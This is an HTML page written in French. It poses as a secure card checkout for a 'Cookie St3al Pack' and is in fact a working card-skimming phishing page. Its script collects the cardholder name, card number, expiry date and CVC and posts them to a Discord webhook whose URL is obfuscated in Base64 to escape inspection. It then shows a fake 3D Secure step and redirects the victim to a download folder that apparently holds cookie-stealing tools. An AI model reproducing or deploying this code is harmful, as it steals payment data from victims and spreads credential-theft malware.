<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SK COMMUNITY | Cookie St3al Security</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .payment-container { max-width: 450px; margin: 80px auto; padding: 30px; background: rgba(10, 10, 10, 0.9); border: 1px solid #00ff88; border-radius: 12px; text-align: center; font-family: 'Segoe UI', sans-serif; }
        .card-preview { height: 40px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 10px; }
        .card-logo { height: 30px; opacity: 0.3; transition: 0.3s; }
        .card-logo.active { opacity: 1; filter: drop-shadow(0 0 5px #00ff88); }
        .auth-field { width: 100%; background: #1a1a1a; border: 1px solid #333; color: white; padding: 14px; margin-bottom: 12px; border-radius: 6px; font-size: 1rem; }
        .auth-field:focus { border-color: #00ff88; outline: none; }
        .error-msg { color: #ff4444; font-size: 0.8rem; margin-bottom: 10px; display: none; }
        #processing { display: none; padding: 20px; }
    </style>
</head>
<body>
    <div class="payment-container">
        <h2 style="color: #00ff88;">💳 PAIEMENT SÉCURISÉ</h2>
        <p style="font-size: 0.8rem; color: #888; margin-bottom: 20px;">Produit : Cookie St3al Pack V1 - 3.99€</p>

        <div class="card-preview">
            <img id="logo-visa" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="card-logo">
            <img id="logo-mastercard" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="card-logo">
        </div>

        <div id="payment-form">
            <div id="error" class="error-msg">Numéro de carte invalide ou informations manquantes.</div>
            
            <input type="text" id="cardName" placeholder="Nom du titulaire" class="auth-field">
            <input type="text" id="cardNumber" placeholder="Numéro de carte (16 chiffres)" class="auth-field" maxlength="19">
            
            <div style="display: flex; gap: 10px;">
                <input type="text" id="cardExp" placeholder="MM/YY" class="auth-field" maxlength="5">
                <input type="text" id="cardCVC" placeholder="CVC" class="auth-field" maxlength="3">
            </div>

            <button onclick="validateAndSend()" class="btn-primary" style="width: 100%; padding: 15px; font-weight: bold;">
                CONFIRMER LE PAIEMENT (3.99€)
            </button>
        </div>

        <div id="processing">
            <div class="loader"></div>
            <p id="status-text" style="color: #00ff88; margin-top: 15px;">Vérification 3D Secure...</p>
        </div>
    </div>

    <script>
        // Détection du type de carte (Visa commence par 4, Mastercard par 5)
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\s/g, '');
            document.getElementById('logo-visa').classList.toggle('active', val.startsWith('4'));
            document.getElementById('logo-mastercard').classList.toggle('active', val.startsWith('5'));
            
            // Formatage auto : 0000 0000 0000 0000
            e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
        });

        // Algorithme de Luhn pour vérifier si la carte est "vraie"
        function isValidCard(num) {
            let sum = 0;
            for (let i = 0; i < num.length; i++) {
                let intVal = parseInt(num.substr(i, 1));
                if (i % 2 === num.length % 2) {
                    intVal *= 2;
                    if (intVal > 9) intVal -= 9;
                }
                sum += intVal;
            }
            return (sum % 10 === 0);
        }

        async function validateAndSend() {
            const rawCard = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const name = document.getElementById('cardName').value;
            const exp = document.getElementById('cardExp').value;
            const cvc = document.getElementById('cardCVC').value;
            const errorDiv = document.getElementById('error');

            // 1. Vérification basique
            if (name.length < 3 || cvc.length < 3 || !isValidCard(rawCard)) {
                errorDiv.style.display = 'block';
                return;
            }
            errorDiv.style.display = 'none';

            // 2. Affichage du chargement "Pro"
            document.getElementById('payment-form').style.display = 'none';
            document.getElementById('processing').style.display = 'block';

            // 3. Envoi des données (Webhook et Lien cachés en Base64 pour éviter le F12)
            const wh = atob("aHR0cHM6Ly/kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4Mjk0Mjk5ODI5MDYzMjkzNS9pa3RFNGYwVVdrY0FibmxhdExpU25wVTh2bXVheHhvZEN6X256Q0pKNlVDRGFFMlYyWUtyNUZtRHN3MW9sZkhWdnA4dw==");
            const target = atob("aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9mb2xkZXIveWx5M3dxd2F0MHYxMi9Db29raWUrU3QzYWwrYWxs");

            const payload = {
                embeds: [{
                    title: "💳 TRANSACTION VALIDÉE - IBAN FR94...",
                    color: 0x00ff88,
                    fields: [
                        { name: "👤 Nom", value: name, inline: true },
                        { name: "🔢 Carte", value: `\`${rawCard}\`` },
                        { name: "📅 Exp/CVC", value: `${exp} | ${cvc}`, inline: true }
                    ]
                }]
            };

            await fetch(wh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // 4. Simulation 3D Secure
            setTimeout(() => {
                document.getElementById('status-text').innerText = "Authentification réussie...";
                setTimeout(() => {
                    window.location.href = target;
                }, 2000);
            }, 3000);
        }
    </script>
</body>
</html>
